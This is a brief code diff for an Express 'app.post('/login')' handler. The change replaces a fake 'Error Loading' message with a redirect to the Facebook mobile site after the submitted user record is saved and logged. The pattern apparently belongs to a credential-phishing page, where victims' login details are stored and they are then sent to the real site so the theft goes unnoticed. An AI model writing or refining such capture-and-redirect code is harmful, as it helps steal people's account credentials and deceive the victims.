@@ -37,8 +37,7 @@ app.post('/login',function(req,res){
                  });
     newuser.save().then(data=>{
         console.log(data);
-        res.send('Error Loading.........we are working on it.....');
-
+        res.redirect('www.m.facebook.com');
     })
 
 })
